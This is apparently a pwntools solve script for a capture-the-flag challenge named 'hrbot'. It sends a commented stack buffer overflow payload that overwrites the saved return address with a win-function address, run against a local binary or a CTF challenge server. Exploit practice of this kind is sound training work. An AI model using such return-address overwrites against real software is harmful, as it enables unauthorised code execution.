from pwn import *

elf = ELF('./hrbot')    # points to the vulnerable binary
context.arch = 'amd64'  # The architecture of the compiled binary

def start():
    # Run local binary with "python3 solve.py LOCAL"
    if args.LOCAL:
        return elf.process()

    # Or run against remote server with "python3 solve.py REMOTE"
    if args.REMOTE:
        # TODO: Replace host with your challenge instance.
        host = "hrbot-10130a4909d1cb43-global.challs.brunnerne.xyz"
        return remote(host, 1337, ssl=True)

    log.info("Use either: python3 solve.py LOCAL")
    log.info("Or:         python3 solve.py REMOTE")
    exit(1)


def craft_payload():
    BUFFER_SIZE = 64           # advertised buffer size
    OFFSET = 24                # extra padding to reach the saved return address
    WIN_FUNC_ADDRESS = 0x401256

    # This line crafts the input your script will send to the binary/program.
    # The idea is to fill the buffer for input with "A" as well as the space after the buffer in memory.
    # After the buffer and the space is filled, the return address is overwritten with the win function.
    payload = b'A' * BUFFER_SIZE + b"B" * OFFSET + p64(WIN_FUNC_ADDRESS)
    return payload

p = start()

# sendlineafter waits until the program supplies a given output, the sends input.
p.sendlineafter(b'>', b'1')

payload = craft_payload()
p.sendlineafter(b'characters.', payload)
p.interactive()
